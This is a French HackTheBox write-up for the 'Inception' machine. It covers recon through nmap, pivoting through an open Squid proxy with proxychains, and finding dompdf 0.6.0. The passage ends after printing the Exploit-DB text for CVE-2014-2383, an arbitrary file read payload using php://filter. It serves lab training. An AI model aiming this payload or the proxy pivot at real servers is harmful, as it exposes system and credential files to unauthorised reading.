![inception](https://i.imgur.com/MScWMDt.png)

Bonjour à tous, aujourd'hui je vous présente une machine notée hard qui été vraiment original et j'ai pris du plaisir à la root : **Inception** de **HackTheBox**.

# Recon

## Nmap 10.10.10.67

```sh
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

La machine contient :
  1. Un serveur Apache
  2. Un proxy Squid 

## Enumeration Squid

En utilisant [proxychains](https://github.com/haad/proxychains), nous pouvons tenter de passer par ce proxy sans authentification.

Proxychains fonctionne pour les paquets TCP mais pas UDP, donc pour nmap par exemple si nous voulons scanner à travers un proxy il va falloir rajouter le paramètre **-sT** pour préciser à nmap de faire un **scan TCP** (et non SYN par défaut)

Proxychains va prendre les proxies de haut en bas, deplus il y a plusieurs options :

- **Strict chaining**, proxychains suit obligatoirement le chemin donné dans `/etc/proxychains.conf`
- **Dynamic chaining**, proxychains va d'abord détecter si le proxy est up avant de l'utiliser
- **Random chaining**, tout est dans le nom, il va pas suivre un ordre précis

Pour nous connecter au proxy je vais ajouter ceci à ma configuration proxychains : 

`http	10.10.10.67	3128`

Ensuite nous pouvons tenter un scan nmap sur le localhost du serveur distant (le flag -f nous permet de spécifier le path de notre fichier de configuration) :

```sh
❯ proxychains -f proxychains.conf nmap -sT 127.0.0.1 -Pn
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 14:21 CET
[proxychains] Dynamic chain  ...  10.10.10.67:3128  ...  127.0.0.1:113 <--denied
...
Nmap scan report for localhost (127.0.0.1)
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3128/tcp open  squid-http
```

Nous découvrons un serveur SSH accéssible seulement en local cependant nous pouvons nous y connecter en passant par le proxy.

## Enumeration Web

Un WebDIR nous dévoile un directory /dompdf :

![webdir](https://i.imgur.com/oQlS9iA.png)

Après quelques recherches [dompdf](https://github.com/dompdf/dompdf) est un convertisseur HTML to PDF.

Nous pouvons trouver la version de cette outil dans le fichier /dompdf/VERSION. Nous avons ici **DOMPDF 0.6.0**.

# Foothold + Scripting

```sh
❯ searchsploit dompdf 0.6.0
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                | php/webapps/33004.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
❯ searchsploit -m php/webapps/33004.txt
  Exploit: dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/33004
     Path: /usr/share/exploitdb/exploits/php/webapps/33004.txt
❯ cat 33004.txt
Vulnerability title: Arbitrary file read in dompdf
CVE: CVE-2014-2383
Vendor: dompdf
Affected version: v0.6.0

Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Web interface:
   
http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```
